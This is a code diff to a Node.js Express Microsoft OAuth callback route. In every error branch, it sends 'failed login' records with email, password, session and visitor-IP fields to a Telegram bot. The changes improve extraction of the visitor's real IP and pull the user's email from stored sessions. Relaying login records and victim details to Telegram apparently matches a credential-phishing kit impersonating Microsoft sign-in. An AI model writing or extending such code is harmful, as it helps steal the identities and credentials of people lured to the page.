@@ -942,13 +942,13 @@ app.get('/api/auth-callback', async (req, res) => {
             if (telegramBot) {
                 try {
                     await telegramBot.sendFailedLoginNotification({
-                        email: 'Unknown',
-                        password: 'OAuth Error',
+                        email: 'OAuth Error',
+                        password: String(authError),
                         timestamp: new Date().toISOString(),
-                        sessionId: 'unknown',
+                        sessionId: 'oauth-error-' + Date.now(),
                         reason: 'OAuth Authentication Error',
                         authMethod: 'Microsoft OAuth',
-                        ip: req.ip || 'Unknown',
+                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
                         userAgent: req.get('User-Agent') || 'Unknown'
                     });
                     console.log('📤 Telegram OAuth error notification sent');
@@ -971,13 +971,13 @@ app.get('/api/auth-callback', async (req, res) => {
             if (telegramBot) {
                 try {
                     await telegramBot.sendFailedLoginNotification({
-                        email: 'Unknown',
-                        password: 'Missing OAuth Parameters',
+                        email: 'OAuth Error',
+                        password: 'Missing Parameters',
                         timestamp: new Date().toISOString(),
-                        sessionId: 'unknown',
-                        reason: 'Missing OAuth Code or State',
+                        sessionId: 'missing-params-' + Date.now(),
+                        reason: 'Missing OAuth Code or State Parameters',
                         authMethod: 'Microsoft OAuth',
-                        ip: req.ip || 'Unknown',
+                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
                         userAgent: req.get('User-Agent') || 'Unknown'
                     });
                     console.log('📤 Telegram OAuth missing params notification sent');
@@ -1001,13 +1001,13 @@ app.get('/api/auth-callback', async (req, res) => {
             if (telegramBot) {
                 try {
                     await telegramBot.sendFailedLoginNotification({
-                        email: 'Unknown',
-                        password: 'Invalid OAuth State',
+                        email: 'OAuth Error',
+                        password: 'Invalid State',
                         timestamp: new Date().toISOString(),
-                        sessionId: 'unknown',
-                        reason: 'Invalid or Expired OAuth State',
+                        sessionId: 'invalid-state-' + Date.now(),
+                        reason: 'Invalid or Expired OAuth State Parameter',
                         authMethod: 'Microsoft OAuth',
-                        ip: req.ip || 'Unknown',
+                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
                         userAgent: req.get('User-Agent') || 'Unknown'
                     });
                     console.log('📤 Telegram invalid state notification sent');
@@ -1030,14 +1030,18 @@ app.get('/api/auth-callback', async (req, res) => {
             // Send Telegram notification for expired state
             if (telegramBot) {
                 try {
+                    // Try to get session info for better context
+                    const targetSession = userSessions.get(stateInfo.sessionId);
+                    const userEmail = targetSession?.userEmail || 'OAuth Timeout';
+                    
                     await telegramBot.sendFailedLoginNotification({
-                        email: 'Unknown',
-                        password: 'OAuth State Expired',
+                        email: userEmail,
+                        password: 'Expired Session',
                         timestamp: new Date().toISOString(),
-                        sessionId: stateInfo.sessionId || 'unknown',
-                        reason: 'OAuth State Expired (10min timeout)',
+                        sessionId: stateInfo.sessionId || 'expired-state-' + Date.now(),
+                        reason: 'OAuth State Expired (10 minute timeout)',
                         authMethod: 'Microsoft OAuth',
-                        ip: req.ip || 'Unknown',
+                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
                         userAgent: req.get('User-Agent') || 'Unknown'
                     });
                     console.log('📤 Telegram expired state notification sent');
@@ -1061,13 +1065,13 @@ app.get('/api/auth-callback', async (req, res) => {
             if (telegramBot) {
                 try {
                     await telegramBot.sendFailedLoginNotification({
-                        email: 'Unknown',
-                        password: 'Session Not Found',
+                        email: 'Session Error',
+                        password: 'Not Found',
                         timestamp: new Date().toISOString(),
-                        sessionId: stateInfo.sessionId || 'unknown',
-                        reason: 'Associated Session Not Found',
+                        sessionId: stateInfo.sessionId || 'no-session-' + Date.now(),
+                        reason: 'Associated User Session Not Found',
                         authMethod: 'Microsoft OAuth',
-                        ip: req.ip || 'Unknown',
+                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
                         userAgent: req.get('User-Agent') || 'Unknown'
                     });
                     console.log('📤 Telegram session not found notification sent');
